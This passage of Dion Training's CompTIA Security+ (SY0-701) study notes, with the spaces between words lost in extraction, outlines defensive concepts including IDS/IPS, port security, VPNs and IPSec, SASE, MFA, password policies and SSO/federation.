+● IDSandIPS○ Keydifference■ IDS-Logsandalerts■ IPS-Logs,alerts,andtakesaction○ IntrusionDetectionSystems(IDS)■ Logsoralertsthatitfoundsomethingsuspiciousormalicious■ ThreeTypesofIntrusionDetectionSystems(IDS)● Network-basedIDS(NIDS)○ Monitorsthetrafficcominginandoutofanetwork● Host-basedIDS(HIDS)○ Looksatsuspiciousnetworktrafficgoingtoorfromasingleor
+
+endpoint● WirelessIDS(WIDS)○ Detectsattemptstocauseadenialofaserviceonawireless
+
+network■ Intrusiondetectionsystemsoperateeitherusingsignature-basedor
+
+anomaly-baseddetectionalgorithms● Signature-basedIDS○ Analyzestrafficbasedondefinedsignaturesandcanonly
+
+recognizeattacksbasedonpreviouslyidentifiedattacksinits
+
+database■ Pattern-matching● Specificpatternofsteps● NIDS,WIDS■ Stateful-matching● Knownsystembaseline
+
+213https://www.DionTraining.com
+
+## Page 214
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● HIDS● Anomaly-basedIDS○ Analyzestrafficandcomparesittoanormalbaselineoftrafficto
+
+determinewhetherathreatisoccurring○ FiveTypesofAnomaly-basedDetectionSystems■ Statistical■ Protocol■ Traffic■ RuleorHeuristic■ Application-based○ IntrusionPreventionSystems(IPS)■ Logs,alerts,andtakesactionwhenitfindssomethingsuspiciousormalicious■ Scanstraffictolookformaliciousactivityandtakesactiontostopit
+
+● NetworkAppliances○ NetworkAppliance■ Adedicatedhardwaredevicewithpre-installedsoftwareforspecificnetworking
+
+services○ DifferentTypesofNetworkAppliances■ LoadBalancers● Distributenetwork/applicationtrafficacrossmultipleservers● Enhanceserverefficiencyandpreventoverload● Ensureredundancyandreliability● Performcontinuoushealthchecks● ApplicationDeliveryControllers(ADCs)offeradvancedfunctionality● Essentialforhigh-demandenvironmentsandhigh-trafficwebsites
+
+214https://www.DionTraining.com
+
+## Page 215
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ ProxyServers● Actasintermediariesbetweenclientsandservers● Providecontentcaching,requestsfiltering,andloginmanagement● Enhancerequestspeedandreducebandwidthusage● Addasecuritylayerandenforcenetworkutilizationpolicies● ProtectagainstDDoSattacks● Facilitateloadbalancinganduserauthentication● Handledataencryptionandensurecompliancewithdatasovereignty
+
+laws■ Sensors● Monitor,detect,andanalyzenetworktrafficanddataflow● Identifyunusualactivities,securitybreaches,andperformanceissues● Providereal-timeinsightsforproactivenetworkmanagement● Aidinperformancemonitoringandalerting● Actasthefirstlineofdefenseagainstcyberthreats■ JumpServers/JumpBox● Securegatewaysforsystemadministratorstoaccessdevicesindifferent
+
+securityzones● Controlaccessandreducetheattacksurfacearea● Offerprotectionagainstdowntimeanddatabreaches● Simplifyloggingandauditing● Speedupincidentresponseduringcyber-attacks● Streamlinesystemmanagementandmaintenance● Hostessentialtoolsandscripts● Monitorsystemhealthforperformanceandsecurity
+
+215https://www.DionTraining.com
+
+## Page 216
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● PortSecurity○ PortSecurity■ Anetworkswitchfeaturethatrestrictsdeviceaccesstospecificportsbasedon
+
+MACaddresses■ Enhancesnetworksecuritybypreventingunauthorizeddevicesfromconnecting○ NetworkSwitches■ NetworkingdevicesthatoperateatLayer2oftheOSImodel■ UseMACaddressesfortrafficswitchingdecisionsthroughtransparentbridging■ Efficientlypreventcollisions,operateinfullduplexmode■ RememberconnecteddevicesbasedonMACaddresses■ Broadcasttrafficonlytointendedreceivers,increasingsecurity○ CAMTable(ContentAddressableMemory)■ StoresMACaddressesassociatedwithswitchports■ VulnerabletoMACfloodingattacks,whichcancausetheswitchtofailopen○ PortSecurityImplementation■ AssociatespecificMACaddresseswithinterfaces■ Preventunauthorizeddevicesfromconnecting■ CanuseStickyMACsforeasiersetup■ SusceptibletoMACspoofingattacks○ 802.1xAuthentication■ Providesport-basedauthenticationforwiredandwirelessnetworks■ Requiresthreeroles● Supplicant● Authenticator● Authenticationserver■ UtilizesRADIUSorTACACS+foractualauthentication
+
+216https://www.DionTraining.com
+
+## Page 217
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Preventsroguedeviceaccess○ RADIUSvs.TACACS+■ RADIUSiscross-platform,whileTACACS+isCiscoproprietary■ TACACS+isslowerbutoffersadditionalsecurityandindependentlyhandles
+
+authentication,authorization,andaccounting■ TACACS+supportsallnetworkprotocols,whereasRADIUSlackssupportforsome○ EAP(ExtensibleAuthenticationProtocol)■ Aframeworkforvariousauthenticationmethods■ Hasdifferentvariantswhichhavetheirownfeatures● EAP-MD5○ Usessimplepasswordsandthechallengehandshake
+
+authenticationprocesstoprovideremoteaccessauthentication○ One-wayauthenticationprocess○ Doesn’tprovidemutualauthentication● EAP-TLS○ Usespublickeyinfrastructurewithadigitalcertificatewhichis
+
+installedonboththeclientandtheserver○ Usesmutualauthentication● EAP-TTLS○ REquiresadigitalcertificateontheserver,butnotontheclient○ Theclientusesapasswordforauthentication● EAP-FAST○ Usesprotectedaccesscredential,insteadofacertificate,to
+
+establishmutualauthentication● PEAP○ Supportsmutualauthenticationusingservercertificatesand
+
+217https://www.DionTraining.com
+
+## Page 218
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+ActiveDirectorydatabasestoauthenticateapasswordfromthe
+
+client● EAP-LEAP○ CiscoproprietaryandlimitedtoCiscodevices○ IntegrationforNetworkSecurity■ Combiningportsecurity,802.1X,andEAPenhancesnetworksecurity■ Ensuresonlyauthenticatedandauthorizeddevicescanaccesssensitiveresources
+
+● SecuringNetworkCommunications○ VirtualPrivateNetworks(VPNs)■ Extendprivatenetworksacrosspublicnetworks■ Allowremoteuserstosecurelyconnecttoanorganization'snetwork■ Canbeconfiguredassite-to-site,client-to-site,orclientlessVPNs● Site-to-SiteVPN○ Connectstwositescost-effectively○ Replacesexpensiveleasedlines○ UtilizesaVPNtunneloverthepublicinternet○ Encryptsandsecuresdatabetweensites○ Slower,butmoresecure● Client-to-SiteVPN○ Connectsasinglehost(e.g.,laptop)tothecentraloffice○ Idealforremoteuseraccesstothecentralnetwork○ Optionsforfulltunnelandsplittunnelconfigurations● ClientlessVPN○ Usesawebbrowsertoestablishsecure,remote-accessVPN○ Noneedfordedicatedsoftwareorhardwareclient
+
+218https://www.DionTraining.com
+
+## Page 219
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ UtilizesHTTPSandTLSprotocolsforsecureconnectionsto
+
+websites■ Inadditiontosite-to-siteandclient-to-siteVPNs,wehavetodecidewhetherwe
+
+aregoingtouseafulltunnelorsplittunnelVPNconfiguration● FullTunnelVPN○ EncryptsandroutesallnetworkrequeststhroughtheVPN○ Provideshighsecurity,clientsfullypartofcentralnetwork○ Limitsaccesstolocalresources○ Suitableforremoteaccesstocentralresources● SplitTunnelVPN○ Dividestraffic,routingsomethroughtheVPN,somedirectlyto
+
+theinternet○ EnhancesperformancebybypassingVPNfornon-centraltraffic○ Lesssecure;potentialexposuretoattackers○ Recommendedforbetterperformancebutrequirescautionon
+
+untrustednetworks○ TransportLayerSecurity(TLS)■ Providesencryptionandsecurityfordataintransit■ Usedforsecureconnectionsinwebbrowsers(HTTPS)■ UsesTransmissionControlProtocol(TCP)forsecureconnectionsbetweenaclient
+
+andaserver● mayslowdowntheconnection■ DatagramTransportLayerSecurity(DTLS)● AfasterUserDatagramProtocol-based(UDP-based)alternative● Ensuresend-usersecurityandprotectsagainsteavesdroppinginclientless
+
+VPNconnections
+
+219https://www.DionTraining.com
+
+## Page 220
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Ensuresconfidentiality,integrity,andauthenticationofdata○ InternetProtocolSecurity(IPSec)■ AsecureprotocolsuiteforIPcommunication■ Providesconfidentiality,integrity,authentication,andanti-replayprotection■ Usedforbothsite-to-siteandclient-to-siteVPNs■ FivekeystepsinestablishinganIPSecVPN● RequesttostarttheInternetKeyExchange(IKE)○ PC1initiatestraffictoPC2,triggeringIPSectunnelcreationby
+
+RTR1● Authentication-IKEPhase1○ RTR1andRTR2negotiatesecurityassociationsfortheIPSecIKE
+
+Phase1(ISAKMP)tunnel● Negotiation-IKEPhase2○ IKEPhase2establishesatunnelwithinthetunnel● Datatransfer○ DatatransferbetweenPC1andPC2takesplacesecurely● Tunneltermination○ TunneltorndownincludingthedeletionofIPSecsecurity
+
+associations■ IPSecTunnelingModes(Datatransfer)● TransportMode○ UsesoriginalIPheader○ Suitableforclient-to-siteVPNs○ AvoidspotentialfragmentationissuesfromMTUconstraints■ MTU(MaximumTransmissionUnit)● setbydefaultat1500bytesandmaycause
+
+220https://www.DionTraining.com
+
+## Page 221
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+fragmentationandotherVPNproblems○ Doesnotincreasepacketsize● TunnelingMode○ Addsanewheadertoencapsulatetheentirepacket○ Idealforsite-to-siteVPNs○ Mayincreasepacketsizeandrequirejumboframes○ Providesconfidentialityforbothpayloadandheader■ AuthenticationHeader(AH)● OffersconnectionlessdataintegrityanddataoriginauthenticationforIP
+
+datagramsusingcryptographichashesasidentificationinformation■ EncapsulatingSecurityPayload(ESP)● Providesconfidentiality,integrity,andencryption● Providesreplayprotection● Encryptsthepacket’spayload○ Considerations■ BalancebetweensecurityandperformancewhenchoosingVPNtunneltype■ UsefulltunnelVPNsforhighersecuritybutreducedlocalaccess■ UsesplittunnelVPNsforbetterperformancebutpotentiallylowersecurity■ EnsureproperMTUsettingswhenusingtunnelingmodeinsite-to-siteVPNs■ AHforintegrityandESPforencryptioninIPSec,butbothcanbeusedtogether
+
+forcomprehensivesecurity
+
+● SD-WANandSASE○ SD-WAN(Software-DefinedWideAreaNetwork)■ Avirtualizedapproachtomanagingandoptimizingwideareanetwork
+
+connections
+
+221https://www.DionTraining.com
+
+## Page 222
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Purpose● Efficientlyroutestrafficbetweenremotesites,datacenters,andcloud
+
+environments■ Benefits● Increasedagility,security,andefficiencyforgeographicallydistributed
+
+workforces■ Control● Software-basedarchitecturewithcontrolextractedfromunderlying
+
+hardware■ TransportServices● Allowstheuseofvarioustransportservices○ MPLS○ Cellular○ Microwavelinks○ Broadbandinternet■ CentralizedControl● Utilizescentralizedcontrolfunctionforintelligenttrafficrouting■ TraditionalWANvs.SD-WAN● TraditionalWANs○ Cannotefficientlyintegratecloudservices● SD-WAN○ Enablesdynamicandefficientrouting,improvingvisibility,
+
+performance,andmanageability■ UseCases● Idealforenterpriseswithmultiplebranchofficesmovingtowards
+
+cloud-basedservices
+
+222https://www.DionTraining.com
+
+## Page 223
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ IaaS○ PaaS○ SaaS○ SASE(SecureAccessServiceEdge)■ AnetworkarchitecturecombiningnetworksecurityandWANcapabilitiesina
+
+singlecloud-basedservice■ Purpose● Addresseschallengesofsecuringandconnectingusersanddataacross
+
+distributedlocations■ KeyTechnology● Utilizessoftware-definednetworking(SDN)forsecurityandnetworking
+
+servicesfromthecloud■ Components● Firewalls● VPNs● Zero-trustnetworkaccess● CloudAccessSecurityBrokers(CASBs)■ PolicyandManagement● Deliveredthroughacommonsetofpolicyandmanagementplatforms■ CloudProviders● MajorcloudprovidersofferservicesalignedwithSASE● Examples:○ AWSVPC○ AzureVirtualWAN○ AzureExpressRoutes○ GoogleCloudInterconnect
+
+223https://www.DionTraining.com
+
+## Page 224
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ GoogleCloudVPN● Alignment○ Thesecloudservicesoffersecure,flexible,andglobalnetworking
+
+capabilities,aligningwithSASEprinciples○ Importance■ Ascyberthreatsevolveandorganizationsbecomemoregeographically
+
+dispersed,understandingandimplementingSD-WANandSASEarecrucialfor
+
+enhancedsecurityandsuccessfulmigrationtocloud-basedenvironments
+
+● InfrastructureConsiderations○ DevicePlacement■ Properplacementofrouters,switches,andaccesspointsiscrucial■ Correctplacementensures● Optimaldataflow,● Minimizeslatency● Enhancessecurity■ Routersatthenetwork'sedgehelpfiltertrafficefficiently■ Strategicplacementofaccesspointsensurescoverageandreducesinterference■ Switchesshouldbelocatedforeasyconnectiontonetworksegments○ SecurityZonesandScreenedSubnets■ SecurityZones● Isolatedeviceswithsimilarsecurityrequirements■ ScreenedSubnets● Actasbufferzonesbetweeninternalandexternalnetworks● Hostspublic-facingservices,protectingcoreinternalnetworks● Usetheterm"screenedsubnet"insteadof"DMZ"formodern
+
+224https://www.DionTraining.com
+
+## Page 225
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+configurations○ AttackSurface■ Referstopointswhereunauthorizedaccessordataextractioncanoccur■ Alargerattacksurfaceincreasestheriskofvulnerabilities■ Identifyandmitigatevulnerabilitiestoreducetheattacksurface■ Regularlyassessandminimizetheattacksurfacefornetworksecurity○ ConnectivityMethods■ Chooseconnectivitymethodsthatinfluencenetworkperformance,reliability,
+
+andsecurity■ Wired(e.g.,Ethernet)offersstabilityandspeedbutrestrictsmobility■ Wireless(e.g.,Wi-Fi)providesflexibilitybutmaysufferfrominterferenceand
+
+securityissues■ Considerfactorslikescalability,speed,security,andbudgetconstraintswhen
+
+choosingconnectivitymethods○ DeviceAttributes■ Considerwhetherdevicesareactiveorpassive,andiftheyareinlineortapped■ Activedevices(e.g.,intrusionpreventionsystems)● monitorandactonnetworktraffic.■ Passivedevices(e.g.,intrusiondetectionsystems)● observeandreportwithoutalteringtraffic■ Inlinedevicesareinthepathofnetworktraffic■ Tapsandmonitorscapturedatawithoutdisruption■ Aligndevicechoiceswithnetworkgoalsandchallenges
+
+225https://www.DionTraining.com
+
+## Page 226
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ FailureMode■ Choosebetween"fail-open"and"fail-closed"modestohandledevicefailures■ Fail-open● Allowstraffictopassduringafailure,maintainingconnectivitybut
+
+reducingsecurity■ Fail-closed● Blocksalltrafficduringafailure,prioritizingsecurityoverconnectivity■ Thechoicedependsontheorganization'ssecuritypolicyandthecriticalityofthe
+
+networksegment
+
+● SelectingInfrastructureControls○ Control■ Aprotectivemeasureputinplacetoreducepotentialrisksandsafeguardan
+
+- rganization’sassets○ KeyPrinciples■ LeastPrivilege● Usersandsystemsshouldhaveonlynecessaryaccessrightstoreducethe
+attacksurface■ DefenseinDepth● Utilizemultiplelayersofsecuritytoensurerobustprotectionevenifone
+
+controlfails■ Risk-basedApproach● Prioritizecontrolsbasedonpotentialrisksandvulnerabilitiesspecificto
+
+theinfrastructure■ LifecycleManagement● Regularlyreview,update,andretirecontrolstoadapttotheevolving
+
+226https://www.DionTraining.com
+
+## Page 227
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+threatlandscape■ OpenDesignPrinciple● Ensuretransparencyandaccountabilitythroughrigoroustestingand
+
+scrutinyofcontrols○ Methodology■ AssessCurrentState● Understandexistinginfrastructure,vulnerabilities,andcurrentcontrols■ GapAnalysis● Identifydiscrepanciesbetweencurrentanddesiredsecuritypostures■ SetClearObjectives● Definespecificgoalsforaddingnewcontrols(dataprotection,uptime,
+
+compliance,etc.)■ Benchmarking● Compareyourorganization'sprocessesandsecuritymetricswithindustry
+
+bestpractices■ Cost-BenefitAnalysis● Evaluatethebalancebetweendesiredsecuritylevelandrequired
+
+resources■ StakeholderInvolvement● Engagerelevantstakeholderstoensurecontrolsalignwithbusiness
+
+- perations■ MonitoringandFeedbackLoops● Continuouslyrevisitcontrolselectiontoadapttoevolvingthreats○ BestPractices■ ConductRiskAssessment● Regularlyassessthreatsandvulnerabilitiesspecifictoyourorganization,
+227https://www.DionTraining.com
+
+## Page 228
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+andupdateitwithsignificantchanges■ AlignwithFrameworks● Utilizeestablishedframeworks(e.g.,NIST,ISO)toensurecomprehensive
+
+andtestedmethodologies■ CustomizeFrameworks● Tailorframeworkcontrolstoyourorganization'suniqueriskprofileand
+
+businessoperations■ StakeholderEngagementandTraining● Engageallrelevantstakeholdersinthedecision-makingprocess,and
+
+conductregulartrainingtokeeptheworkforceupdatedonsecurity
+
+controlsandthreats
+
+228https://www.DionTraining.com
+
+## Page 229
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+IdentityandAccessManagement(IAM)Solutions
+
+Objectives:● 2.4-Givenascenario,youmustbeabletoanalyzeindicatorsofmaliciousactivity● 4.6-Givenascenario,youmustbeabletoimplementandmaintainidentityandaccess
+
+management
+
+● IdentityandAccessManagement(IAM)Solutions○ IdentityandAccessManagement(IAM)■ Ensuresrightindividualshaverightaccesstorightresourcesforrightreasons■ Components● PasswordManagement● NetworkAccessControl● DigitalIdentityManagement○ IAMProcesses■ Identification,Authentication,Authorization,andAccounting(IAAA)■ IAMSystemProcesses● Identification○ Claimingidentity,e.g.,username,emailaddress● Authentication○ Verifyinguser,device,orsystemidentity● Authorization○ Determininguserpermissionsafterauthentication● Accounting○ Trackingandrecordinguseractivities
+
+229https://www.DionTraining.com
+
+## Page 230
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ IAMConcepts■ Processes● Provisioning● Deprovisioning● IdentityProofing● Interoperability● Attestation○ MultiFactorAuthentication(MFA)■ Factors● Somethingyouknow● Somethingyouhave● Somethingyouare● Somethingyoudo● Somewhereyouare■ Implementations● Biometrics● Hardtokens● Softtokens● Securitykeys● Passkeys○ PasswordSecurity■ BestPractices● Passwordpolicies● Passwordmanagers● Passwordlessauthentication
+
+230https://www.DionTraining.com
+
+## Page 231
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ PasswordAttacks■ Types● SprayingAttacks● BruteForceAttacks● DictionaryAttacks● HybridAttacks○ SingleSign-On(SSO)■ Userauthenticationserviceusingonesetofcredentialsformultipleapplications■ Technologies● LDAP● OAuth● SAML○ Federation■ Sharingandusingidentitiesacrossmultiplesystemsororganizations○ PrivilegedAccessManagement(PAM)■ Involvesthefollowing● Just-in-Time(JIT)Permissions● PasswordVaulting● TemporalAccounts○ AccessControlModels■ MandatoryAccessControl■ DiscretionaryAccessControl■ Role-basedAccessControl■ Rule-basedAccessControl■ Attribute-basedAccessControl
+
+231https://www.DionTraining.com
+
+## Page 232
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ AssigningPermissions■ Bestpracticestoenhanceorganizationsecurity
+
+● IdentityandAccessManagement(IAM)○ IdentityandAccessManagement(IAM)■ Criticalcomponentofenterprisesecurity,focusingonmanagingaccessto
+
+information■ Ensurestherightindividualshaveaccesstotherightresourcesattherighttimes
+
+fortherightreasons○ FourMainIAMProcesses■ Identification● Userclaimsanidentityusingauniqueidentifier(e.g.,usernameoremail
+
+address)● Ensuresuserlegitimacyandaccuracyofprovidedinformation■ Authentication● Verifiestheidentityofauser,device,orsystem● Typicallyinvolvesvalidatingusercredentialsagainstanauthorizeduser
+
+database● Methods○ Passwords○ Biometrics○ Multi-factorauthentication■ Authorization● Determinesthepermissionsoraccesslevelsforauthenticatedusers● Ensuresusershaveaccessonlytoappropriateresources● Role-basedaccesscontroloftenused
+
+232https://www.DionTraining.com
+
+## Page 233
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Accounting(Auditing)● Tracksandrecordsuseractivities○ Logins○ Actions○ Changes● Helpsdetectsecurityincidents,identifyvulnerabilities,andprovide
+
+evidenceincaseofbreaches○ KeyIAMConcepts■ ProvisioningandDeprovisioningofUserAccounts● Provisioning○ Creatingnewuseraccounts,assigningpermissions,andproviding
+
+systemaccess● Deprovisioning○ Removingaccessrightswhennolongerneeded(e.g.,whenan
+
+employeeleaves)■ IdentityProofing● Processofverifyingauser'sidentitybeforecreatingtheiraccount● Mayinvolvecheckingpersonaldetailsorprovidingidentification
+
+documents(e.g.,driver'slicenseorpassport)■ Interoperability● Abilityofdifferentsystems,devices,andapplicationstoworktogether
+
+andshareinformation● InIAM,itcaninvolveusingstandardslikeSAMLorOpenIDConnectfor
+
+secureauthenticationandauthorization■ Attestation● Processofvalidatingthatuseraccountsandaccessrightsarecorrectand
+
+233https://www.DionTraining.com
+
+## Page 234
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+up-to-date● Involvesregularreviewsandauditsofuseraccountsandtheiraccess
+
+rights
+
+● Multi-factorAuthentication○ Multi-factorAuthentication(MFA)■ Asecuritysystemrequiringmultiplemethodsofauthenticationfrom
+
+independentcategoriesofcredentials■ Enhancessecuritybycreatingalayereddefenseagainstunauthorizedaccess○ FiveCategoriesofAuthenticationforMFA■ SomethingYouKnow(Knowledge-BasedFactor)● Authenticationbasedoninformationtheuserknows,likeapassword,
+
+PIN,oranswerstosecretquestions■ SomethingYouHave(Possession-BasedFactor)● Authenticationbasedonphysicalpossessionofanitem○ Smartcard○ Hardwaretoken(keyfob)○ Softwaretokenonadevice■ SomethingYouAre(Inherence-BasedFactor)● Authenticationbasedonbiometriccharacteristicsuniquetoindividuals○ Fingerprints○ Facialrecognition○ Voicerecognition■ SomewhereYouAre(Location-BasedFactor)● Authenticationbasedontheuser'slocation,determinedthroughIP
+
+address,GPS,ornetworkconnection
+
+234https://www.DionTraining.com
+
+## Page 235
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Geographicallocationrestrictionscanbeapplied■ SomethingYouDo(Behavior-BasedFactor)● Authenticationbasedonrecognizinguniquepatternsassociatedwith
+
+userbehavior○ Keystrokepatterns○ Deviceinteraction● Rarelyusedasaprimaryfactorbutcanprovideanadditionallayerof
+
+security○ AuthenticationTypes■ SingleFactorAuthentication● Usesoneauthenticationfactortoaccessauseraccount■ TwoFactorAuthentication(2FA)● Requirestwodifferentauthenticationfactorstogainaccess■ Multi-factorAuthentication(MFA)● Usestwoormorefactorstoauthenticateauser● MFAcaninvolve2,3,4,or5factorsdependingonthechosen
+
+configuration○ Generally,usingmoreauthenticationtypesmakesasystemsafer,
+
+butislessconvenientfortheenduser■ Knowledge-basedfactorslikepasswordsandPINsarethemostcommon
+
+authenticationmethods● Passwordmanagerscangeneratedifferentlong,strong,andcomplex
+
+passwordsforeachwebsiteorapplication■ Passkeys(PasswordlessAuthentication)● Analternativetotraditionalpasswordsforauthentication● Involvescreatingapasskeysecuredbydeviceauthenticationmethodslike
+
+235https://www.DionTraining.com
+
+## Page 236
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+fingerprintorfacialrecognition● Providesamoresecureanduser-friendlyauthenticationmethod● Passkeysutilizepublickeycryptography
+
+● PasswordSecurity○ PasswordSecurity■ Measurestheeffectivenessofapasswordinresistingguessingandbrute-force
+
+attacks■ Estimatesthenumberofattemptsneededtoguessapasswordcorrectly○ GroupPolicyEditorforPasswordPolicies■ UsedtocreatepasswordpoliciesinWindows■ Availableforlocalmachines,andglobalpolicyorchestratorcanbeusedin
+
+domainenvironments○ FiveCharacteristicsofPasswordPolicies■ PasswordLength● Longerpasswordsarehardertocrack● Strongpasswordsshouldbeatleast12to16characters● Longerpasswordsincreasesecurityexponentially■ PasswordComplexity● Combinesuppercaseandlowercaseletters,numbers,andspecial
+
+characters● Complexitymakespasswordsresistanttobruteforceattacks● Themorecharacterchoices,themoresecurethepassword■ PasswordReuse● Avoidusingthesamepasswordformultipleaccounts● Reusingpasswordsincreasesvulnerability
+
+236https://www.DionTraining.com
+
+## Page 237
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ PasswordExpiration● Requiresuserstochangepasswordsafteraspecificperiod● Overemphasisonexpirationcanleadtopoorpasswordchoices■ PasswordAge● Passwordagereferstothetimeapasswordhasbeeninuse● Olderpasswordshaveahigherriskofbeingcompromised○ PasswordManagers■ Toolsforstoringandmanagingpasswordssecurely■ Features● Passwordgeneration○ Passwordmanagerscreateuniquestrongpasswordsforaccounts
+
+topreventreuseandenhancesecurity● Auto-fill○ Passwordmanagersautofilllogindetails,sparinguserstheneedto
+
+recallorinputinformationmanually● Securesharing○ Passwordmanagersprovidesecuremethodstosharepasswords
+
+withoutdirectlydisclosingthepassworditself● Cross-platformaccess○ Passwordmanagersoffercross-devicecompatibility,allowing
+
+accesstopasswordsfromanylocationordevice■ Promotepasswordcomplexity,preventreuse,andoffereasyaccesstostrong,
+
+uniquepasswords○ PasswordlessAuthenticationMethods■ Provideahigherlevelofsecurityandbetteruserexperience
+
+237https://www.DionTraining.com
+
+## Page 238
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Methods● BiometricAuthentication○ Usesuniquebiologicalcharacteristics● HardwareToken○ Generateever-changinglogincodes● One-TimePasswords(OTP)○ Senttoemailorphoneforone-timeuse● MagicLinks○ One-timelinkssentviaemailforautomaticlogin● Passkeys○ Relyondevicescreenlockforauthentication
+
+● PasswordAttacks○ PasswordAttacks■ Methodsusedbyattackerstocrackorrecoverpasswords■ Typesofpasswordattacks● BruteForce● Dictionary● PasswordSpraying● Hybrid○ BruteForceAttack■ Trieseverypossiblecharactercombinationuntilthecorrectpasswordisfound■ Effectiveforsimplepasswordsbuttime-consumingforcomplexones■ Mitigation● Increasingpasswordcomplexityandlength● Limitingloginattempts
+
+238https://www.DionTraining.com
+
+## Page 239
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Usingmultifactorauthentication● EmployingCAPTCHAS○ DictionaryAttack■ Usesalistofcommonlyusedpasswords(adictionary)tocrackpasswords■ Mayincludevariationswithnumbersandsymbols■ Effectiveagainstcommon,easy-to-guesspasswords■ Mitigation● Increasepasswordcomplexityandlength,limitloginattempts,use
+
+multifactorauthentication,andemployCAPTCHAS○ PasswordSpraying■ Aformofbruteforceattackthattriesafewcommonpasswordsagainstmany
+
+usernamesoraccounts■ Effectivebecauseitavoidsaccountlockoutsandtargetsweakpasswords■ Mitigation● Useuniquepasswordsandimplementmulti-factorauthentication○ HybridAttack■ Combineselementsofbruteforceanddictionaryattacks■ Mayincludevariations,suchasaddingnumbersorspecialcharactersto
+
+passwords■ Canuseastaticdictionaryordynamicallycreatevariations■ Effectivefordiscoveringpasswordsfollowingspecificpatterns
+
+● SingleSign-On(SSO)○ SingleSign-On(SSO)■ Authenticationprocessallowinguserstoaccessmultipleapplicationswithone
+
+setofcredentials
+
+239https://www.DionTraining.com
+
+## Page 240
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Simplifiestheuserexperienceandenhancesproductivity■ TrustedrelationshipbetweenapplicationsandIdentityProviders(IdP)○ HowSSOWorks■ Userlogsintotheprimaryidentityprovider(IdP)■ AccessesasecondaryapplicationorwebsiteconfiguredforSSO■ Thesecondaryapplicationverifiestheuser'sidentitywiththeIdP'sassertion■ Onceauthenticated,accesstothesecondaryapplicationisgranted○ BenefitsofSSO■ Improveduserexperience■ Increasedproductivity■ ReducedITsupportcosts■ Enhancedsecurity,encouragingstrongerpasswords○ ProtocolsforSSO■ LDAP(LightweightDirectoryAccessProtocol)● Usedtoaccessandmaintaindistributeddirectoryinformation● Canshareuserinformationacrossnetworkresources● Supportscentralrepositoryforauthenticationandauthorization● CanbesecuredusingLDAPS(LDAPoverSSLorStartTLS)● LDAPstoresuserdataforauthorization,likegroupmembershipsand
+
+roles■ OAuth(OpenAuthorization)● Openstandardfortoken-basedauthenticationandauthorization● Allowsthird-partyservicestoaccessuseraccountinformationwithout
+
+exposingpasswords● OftenusedinRESTfulAPIsforsecuresharingofuserprofiledata○ Theclientapporserviceregisterswiththeauthorizationserver,
+
+240https://www.DionTraining.com
+
+## Page 241
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+providesaredirectURLandgetsanIDandsecret● UsesJSONWebTokens(JWT)fordatatransfer■ SAML(SecurityAssertionMarkupLanguage)● Standardforloggingusersintoapplicationsbasedonsessionsinanother
+
+context● Redirectsuserstoanidentityproviderforauthentication● Eliminatestheneedforservicestoauthenticateusersdirectly● Decouplesservicesfromidentityproviders,enhancingsecurityand
+
+flexibility
+
+● Federation○ Federation■ Linkselectronicidentitiesandattributesacrossmultipleidentitymanagement
+
+systems■ Enablesuserstousethesamecredentialsforloginacrosssystemsmanagedby
+
+differentorganizations■ Basedontrustrelationshipsbetweensystems■ Federationextendsbeyondanorganization'sboundaries● Partners● Suppliers● Customers■ Simplifiesuseraccesstovariousservices■ Ensuressecuritythroughtrustrelationshipsbetweennetworks○ FederationProcess■ LoginInitiation● Useraccessesaserviceorapplicationandchoosestologin
+
+241https://www.DionTraining.com
+
+## Page 242
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ RedirectiontoIdentityProvider● ServiceProvider(SP)redirectstheusertotheirIdentityProvider(IdP)for
+
+authentication■ Authenticationoftheuser● IdPvalidatestheuser'sidentityusingstoredcredentials● Validatestheuser’sidentity■ GenerationofAssertion● IdPcreatesanassertion(token)withuseridentityandauthentication
+
+statusinastandardizedformat■ ReturntoServiceProvider● Userreturnstotheoriginalserviceorapplicationwiththeassertionfrom
+
+theIdP■ VerificationandAccess● ServiceProviderverifiestheassertionandgrantsaccessbasedonthe
+
+informationitcontains■ LoginComplete● Usergainsaccesstotheserviceorapplicationandpotentiallyothers
+
+withinthefederationwithoutadditionallogins○ Benefits■ Simplifieduserexperience■ Reducedadministrativeoverhead■ Increasedsecuritythroughreducedpasswordreuseandimprovedmanagement
+
+● PrivilegedAccessManagement(PAM)○ PrivilegedAccessManagement(PAM)■ SolutionthatrestrictsandmonitorsprivilegedaccesswithinanITenvironment
+
+242https://www.DionTraining.com
+
+## Page 243
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Thepolicies,procedures,andtechnicalcontrolsthatareusedtoprevent
+
+maliciousabuseofprivilegedaccounts■ Crucialforpreventingdatabreachesandensuringtheleastprivilegedaccessis
+
+grantedforspecifictasksorroles○ ComponentsofPrivilegedAccessManagement■ Just-In-TimePermissions(JITPermissions)● Securitymodelthatgrantsadministrativeaccessonlywhenneededfora
+
